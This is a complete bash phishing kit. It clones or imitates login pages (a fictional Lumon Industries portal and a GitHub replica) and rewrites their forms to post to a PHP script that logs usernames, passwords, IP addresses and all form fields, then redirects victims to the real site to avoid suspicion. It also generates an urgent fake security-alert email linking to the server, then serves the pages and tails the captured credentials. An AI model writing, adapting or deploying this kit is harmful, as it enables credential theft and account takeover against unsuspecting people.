#!/bin/bash

# Set text colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Banner
echo -e "${YELLOW}"
echo "╔═════════════════════════════════════════════════╗"
echo "║                                                 ║"
echo "║         PHISHING SITE HOST                      ║"
echo "║                                                 ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check if required tools are installed
check_dependencies() {
    missing_deps=()
    
    # Check for wget
    if ! command -v wget &> /dev/null; then
        missing_deps+=("wget")
    fi
    
    # Check for php
    if ! command -v php &> /dev/null; then
        missing_deps+=("php")
    fi
    
    # Check for sed
    if ! command -v sed &> /dev/null; then
        missing_deps+=("sed")
    fi
    
    # Install missing dependencies
    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo -e "${YELLOW}[INFO]${NC} Installing missing dependencies: ${missing_deps[*]}"
        apt-get update -qq && apt-get install -y "${missing_deps[@]}"
    fi
}

# Check dependencies
check_dependencies

# Load environment variables
if [ -f .env ]; then
    source .env
    echo -e "${YELLOW}[INFO]${NC} Loaded configuration from .env"
else
    echo -e "${RED}[ERROR]${NC} .env file not found. Creating from example..."
    cp .env.example .env
    echo -e "${YELLOW}[INFO]${NC} Created .env from example. Please edit it with your details:"
    echo -e "nano .env"
    exit 1
fi

# Create phishing site directory if it doesn't exist
mkdir -p phishing_site
cd phishing_site

# Function to create default phishing login page
create_default_page() {
    echo -e "${YELLOW}[INFO]${NC} Creating default phishing login page..."
    cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lumon Industries - Employee Portal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 200px;
        }
        h2 {
            text-align: center;
            color: #003366;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 12px;
            background-color: #003366;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #002244;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://via.placeholder.com/200x60?text=Lumon+Industries" alt="Lumon Industries">
        </div>
        <h2>Employee Portal Login</h2>
        <form action="credentials.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            &copy; 2023 Lumon Industries. All rights reserved.
        </div>
    </div>
</body>
</html>
EOF
}

# Function to create a specialized GitHub login form
create_github_page() {
    echo -e "${YELLOW}[INFO]${NC} Creating specialized GitHub login page..."
    cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 1.5;
            color: #24292e;
            background-color: #f6f8fa;
            margin: 0;
            padding: 0;
        }
        .container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            width: 340px;
            margin: 0 auto;
        }
        .logo {
            display: block;
            margin: 40px auto 15px;
            width: 48px;
            height: 48px;
        }
        .login-form {
            padding: 20px;
            background-color: #fff;
            border: 1px solid #d8dee2;
            border-radius: 5px;
            margin-bottom: 16px;
        }
        .login-form h1 {
            margin-bottom: 15px;
            font-size: 24px;
            font-weight: 300;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 7px;
            font-weight: 600;
            font-size: 14px;
        }
        .form-control {
            padding: 6px 12px;
            font-size: 14px;
            width: 100%;
            border: 1px solid #d1d5da;
            border-radius: 3px;
            outline: none;
            box-sizing: border-box;
            height: 32px;
        }
        .form-control:focus {
            border-color: #2188ff;
            box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.3);
        }
        .btn {
            background-color: #2ea44f;
            color: #fff;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 600;
            border: 1px solid rgba(27, 31, 35, 0.15);
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            height: 32px;
            margin-top: 15px;
        }
        .btn:hover {
            background-color: #2c974b;
        }
        .signin-link {
            color: #0366d6;
            text-decoration: none;
        }
        .signin-link:hover {
            text-decoration: underline;
        }
        .login-callout {
            padding: 15px 20px;
            text-align: center;
            border: 1px solid #d8dee2;
            border-radius: 5px;
            background-color: #fff;
        }
        .footer {
            margin: 40px auto;
            text-align: center;
            font-size: 12px;
            color: #6a737d;
            max-width: 500px;
        }
        .footer-links {
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #0366d6;
            text-decoration: none;
            margin: 0 5px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE2IDBDNy4xNiAwIDAgNy4xNiAwIDE2QzAgMjMuMDggNC41OCAyOS4wNiAxMC45NCAzMS4xOEMxMS43NCAzMS4zMiAxMi4wNCAxNC44NCAxMi4wNCAxNC40QzEyLjA0IDE0LjQgMTEuOTIgMTMuOTggMTEuOTIgMTMuNDZDMTEuOTIgMTIuNDYgMTIuNSAxMS40MiAxMi42NCAxMS4xQzEwLjMgMTAuOCA2LjE2IDguMTggNi4xNiA0LjE2QzYuMTYgMi40NiA2Ljg0IDAuODYgOC4wMiAtMC4wMkM4LjIyIC0wLjE2IDguMzYgLTAuMDYgOC40NCAwLjA4QzguNDQgMC4wOCAxMC40MiAzLjA0IDEyLjU2IDQuMzRDMTMuNzggNC4xNiAxNC42IDQuMSAxNS40MiA0LjFDMTYuMjIgNC4xIDE3LjAyIDQuMTYgMTguMjQgNC4zNEMyMC40IDMuMDQgMjIuMzggMC4xIDIyLjM4IDAuMUMyMi40NCAtMC4wNiAyMi42IC0wLjE0IDIyLjc4IC0wLjAyQzI0IDEuMSAyNC42NiAyLjggMjQuNjYgNC4xNkMyNC42NiA4LjI0IDIwLjQgMTAuODQgMTguMDYgMTEuMTJDMTguMjYgMTEuNTggMTguODQgMTIuODYgMTguODQgMTQuMUMxOC44NCAxNS40NCAxOC44IDE4LjEyIDE4Ljc4IDIwLjM0QzE4Ljc4IDIxLjA4IDE4Ljc2IDIxLjggMTguNzYgMjIuNUMxOC43NCAyMy4yMiAxOC43NCAyMy45MiAxOC43NCAyNC41OEMxOC43NCAyNS4xNiAxOC43NiAyNS42OCAxOC44IDI2LjA0QzE4Ljg4IDI2Ljg4IDE5LjA0IDI3LjQgMTkuODQgMjcuNjJDMjEuNTYgMjguMDggMjQgMjcuNTQgMjUuMTYgMjYuOTZDMjcuMzIgMjUuODggMjkuMyAyNC4xIDMwLjY2IDIxLjc0QzMxLjUgMjAuMjYgMzIgMTggMzIgMTZDMzIgNy4xNiAyNC44NCAwIDE2IDBaIiBmaWxsPSIjMjQyOTJlIi8+PC9zdmc+" class="logo" alt="GitHub">
            <div class="login-form">
                <h1>Sign in to GitHub</h1>
                <form action="credentials.php" method="post">
                    <div class="form-group">
                        <label for="login_field">Username or email address</label>
                        <input type="text" name="login" id="login_field" class="form-control" autocapitalize="off" autocorrect="off" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" name="password" id="password" class="form-control" required>
                    </div>
                    <input type="submit" name="commit" value="Sign in" class="btn" data-disable-with="Signing in...">
                </form>
            </div>
            <div class="login-callout">
                <span>New to GitHub? </span>
                <a href="#" class="signin-link">Create an account</a>.
            </div>
        </div>
        <div class="footer">
            <div class="footer-links">
                <a href="#">Terms</a>
                <a href="#">Privacy</a>
                <a href="#">Security</a>
                <a href="#">Contact GitHub</a>
            </div>
        </div>
    </div>
</body>
</html>
EOF
}

# Function to clone a website
clone_website() {
    local target_url=$1
    local clone_dir="cloned_site"
    local redirect_url=""
    
    # Set appropriate redirect URL based on target
    if [[ "$target_url" == *"github.com"* ]]; then
        redirect_url="https://github.com"
        # For GitHub, use our specialized template which works better than cloning
        create_github_page
        echo -e "${GREEN}[SUCCESS]${NC} Created specialized GitHub login page"
        return 0
    elif [[ "$target_url" == *"microsoft.com"* ]] || [[ "$target_url" == *"live.com"* ]]; then
        redirect_url="https://www.microsoft.com"
    elif [[ "$target_url" == *"google.com"* ]]; then
        redirect_url="https://www.google.com"
    elif [[ "$target_url" == *"reddit.com"* ]]; then
        redirect_url="https://www.reddit.com"
    else
        # Extract domain for redirect
        redirect_url=$(echo "$target_url" | grep -o 'https\?://[^/]*' || echo "https://www.google.com")
    fi
    
    # Store the redirect URL for the credential script to use
    echo "$redirect_url" > redirect_url.txt
    
    # Create temporary directory for cloning
    mkdir -p "$clone_dir"
    
    echo -e "${YELLOW}[INFO]${NC} Cloning website: $target_url"
    
    # Download the website with wget
    wget --quiet \
         --no-parent \
         --no-check-certificate \
         --page-requisites \
         --convert-links \
         --adjust-extension \
         --span-hosts \
         --domains=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*$||') \
         --directory-prefix="$clone_dir" \
         --max-redirect=2 \
         --tries=3 \
         --timeout=30 \
         --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36" \
         "$target_url"
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}[ERROR]${NC} Failed to clone website. Using default login page."
        create_default_page
        return 1
    fi
    
    # Find all HTML files in the cloned directory
    echo -e "${YELLOW}[INFO]${NC} Modifying forms to capture credentials..."
    find "$clone_dir" -name "*.html" -o -name "*.htm" | while read html_file; do
        # Look for forms and modify them to submit to our credential capture script
        sed -i 's/<form[^>]*action="[^"]*"/<form action="credentials.php"/g' "$html_file"
        sed -i 's/<form[^>]*action='\''[^'\'']*'\''/<form action='\''credentials.php'\''/g' "$html_file"
        # For forms without an action attribute
        sed -i 's/<form[^>]*>/<form action="credentials.php" method="post">/g' "$html_file"
    done
    
    # Find the main HTML file (usually index.html)
    local main_html=$(find "$clone_dir" -name "index.html" -o -name "index.htm" -o -name "default.html" | head -1)
    
    # If no index file found, use the first HTML file
    if [ -z "$main_html" ]; then
        main_html=$(find "$clone_dir" -name "*.html" -o -name "*.htm" | head -1)
    fi
    
    # If we found a main HTML file, copy it to our root
    if [ -n "$main_html" ]; then
        echo -e "${YELLOW}[INFO]${NC} Using $main_html as the main page"
        cp "$main_html" index.html
        
        # Copy all other files in the directory to the current directory
        cp -r "$clone_dir"/* ./
    else
        echo -e "${RED}[ERROR]${NC} No HTML files found in cloned site. Using default login page."
        create_default_page
    fi
    
    # Clean up
    rm -rf "$clone_dir"
    
    echo -e "${GREEN}[SUCCESS]${NC} Website cloned and configured for credential harvesting"
}

# Check if a URL was provided as argument
if [ -n "$1" ]; then
    # Clone the provided website
    clone_website "$1"
else
    # Use default login page
    create_default_page
fi

# Create credential capture script regardless of the website used
echo -e "${YELLOW}[INFO]${NC} Creating credential capture script..."
cat > credentials.php << 'EOF'
<?php
// Log file to store captured credentials
$log_file = 'captured_credentials.txt';

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Get the visitor's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the user agent (browser info)
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get the referer URL (where they came from)
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

// Initialize credential variables
$username = '';
$password = '';

// Function to log credentials and debug info
function logDebug($message) {
    error_log("[DEBUG] " . $message);
}

// Log raw POST data
logDebug("Raw POST data: " . print_r($_POST, true));

// Check for POST data (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Dump all POST data to error log for debugging
    logDebug("All POST fields: " . print_r($_POST, true));
    
    // Handle GitHub's login form fields
    if (isset($_POST['login']) && !empty($_POST['login'])) {
        $username = $_POST['login'];
    }
    
    // Directly check for 'password' field which is common across most forms
    if (isset($_POST['password']) && !empty($_POST['password'])) {
        $password = $_POST['password'];
        logDebug("Found password field with value length: " . strlen($password));
    } else {
        logDebug("No 'password' field found, searching for alternatives");
    }
    
    // If no direct password field, look for alternatives by name pattern
    if (empty($password)) {
        foreach ($_POST as $key => $value) {
            logDebug("Checking field: $key with value length: " . strlen($value));
            
            // Username fields
            if (empty($username) && 
                (stripos($key, 'user') !== false || 
                 stripos($key, 'email') !== false || 
                 stripos($key, 'login') !== false || 
                 stripos($key, 'id') !== false || 
                 stripos($key, 'account') !== false || 
                 stripos($key, 'name') !== false || 
                 stripos($key, 'mail') !== false)) {
                $username = $value;
                logDebug("Found username in field: $key");
            }
            
            // Password fields
            if (empty($password) && 
                (stripos($key, 'pass') !== false || 
                 stripos($key, 'pwd') !== false || 
                 stripos($key, 'secret') !== false || 
                 stripos($key, 'pw') !== false)) {
                $password = $value;
                logDebug("Found password in field: $key");
            }
        }
    }
    
    // Last resort: if still no username/password, use the first two non-empty fields
    if (empty($username) || empty($password)) {
        logDebug("Using fallback method to find credentials");
        $values = array_filter(array_values($_POST), function($val) { return !empty($val); });
        
        if (count($values) >= 1 && empty($username)) {
            $username = $values[0];
            logDebug("Set username from first non-empty value");
        }
        
        if (count($values) >= 2 && empty($password)) {
            $password = $values[1];
            logDebug("Set password from second non-empty value");
        }
    }
    
    // Format log entry
    $log_entry = "==================================\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Referer: $referer\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    
    // Log all form fields
    $log_entry .= "\nAll form fields:\n";
    foreach ($_POST as $key => $value) {
        $log_entry .= "$key: $value\n";
    }
    
    $log_entry .= "==================================\n\n";
    
    // Write to log file
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    // Output to the browser (this will be seen in the PHP error log)
    error_log("CREDENTIALS CAPTURED - Username: $username, Password: $password");
    
    // Console output for real-time monitoring
    echo "SUCCESS! Credentials captured:\nUsername: $username\nPassword: $password\n";
    
    // Determine where to redirect
    $redirect = 'https://github.com';
    
    // Check if we have a custom redirect URL
    if (file_exists('redirect_url.txt')) {
        $redirect = trim(file_get_contents('redirect_url.txt'));
    }
    
    // Redirect to a legitimate site (to avoid suspicion)
    header('Location: ' . $redirect);
    exit;
}
?>
EOF

# Go back to parent directory
cd ..

# Create HTML email template if it doesn't exist
if [ ! -f html_email_template.html ]; then
    echo -e "${YELLOW}[INFO]${NC} Creating HTML email template..."
    cat > html_email_template.html << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Urgent: Account Security Verification Required</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; line-height: 1.6;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; border-collapse: collapse;">
        <!-- HEADER WITH LOGO -->
        <tr>
            <td align="center" bgcolor="#003366" style="padding: 20px 0;">
                <img src="https://via.placeholder.com/180x60?text=Lumon+Industries" alt="Lumon Industries" width="180" style="display: block;">
            </td>
        </tr>
        
        <!-- CONTENT AREA -->
        <tr>
            <td bgcolor="#ffffff" style="padding: 40px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #153643; font-size: 24px; font-weight: bold;">
                            Urgent: Security Alert - Immediate Action Required
                        </td>
                    </tr>
                    <tr>
                        <td style="padding: 20px 0;">
                            <p>Dear Valued Employee,</p>
                            
                            <p>The IT Security department has detected multiple unauthorized access attempts on your company account. According to our logs, these attempts originated from an unrecognized device.</p>
                            
                            <p>As part of our updated security protocols, <strong>you must verify your account credentials within the next 24 hours</strong> to maintain access to all Lumon Industries systems.</p>
                            
                            <p>This verification is mandatory according to our new company-wide security policy.</p>
                        </td>
                    </tr>
                    <tr>
                        <td align="center" style="padding: 30px 0;">
                            <table border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td align="center" bgcolor="#003366" style="border-radius: 4px;">
                                        <a href="http://${SERVER_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <p>If you did not attempt to access your account, please complete the verification process immediately and then contact the IT Security team at security@mail.lumoninc.com.</p>
                            
                            <p>Failure to verify your account within the specified timeframe may result in temporary account suspension until proper identity verification can be completed.</p>
                            
                            <p>Thank you for your prompt attention to this matter.</p>
                            
                            <p>Regards,<br>
                            Lumon Industries IT Security Team</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        
        <!-- FOOTER -->
        <tr>
            <td bgcolor="#f4f4f4" style="padding: 20px 30px;">
                <table border="0" cellpadding="0" cellspacing="0" width="100%">
                    <tr>
                        <td style="color: #666666; font-size: 12px;">
                            <p>This message contains confidential information and is intended only for the recipient. If you are not the intended recipient, you should not disseminate, distribute or copy this email. Please notify the sender immediately if you have received this email by mistake and delete it from your system.</p>
                            <p>&copy; 2023 Lumon Industries. All rights reserved.</p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
EOF
fi

# Start PHP server and monitor for credentials in one step
echo -e "${GREEN}[STATUS]${NC} Starting the phishing web server with real-time credential capture..."
echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."

# Use a signal trap to clean up child processes when the script is terminated
trap 'kill $(jobs -p) 2>/dev/null' EXIT

cd phishing_site

# Create an empty credentials file if it doesn't exist
touch captured_credentials.txt

# Display real-time credentials 
tail -f captured_credentials.txt 2>/dev/null &

# Start PHP server (will run until Ctrl-C)
if [ "$EUID" -eq 0 ]; then
    # Running as root, try port 80
    php -S 0.0.0.0:80
else
    # Not running as root, suggest sudo
    echo -e "${YELLOW}[WARNING]${NC} Not running as root. For port 80, run with: sudo $0"
    echo -e "${YELLOW}[INFO]${NC} Using fallback port 8080..."
    php -S 0.0.0.0:8080
fi 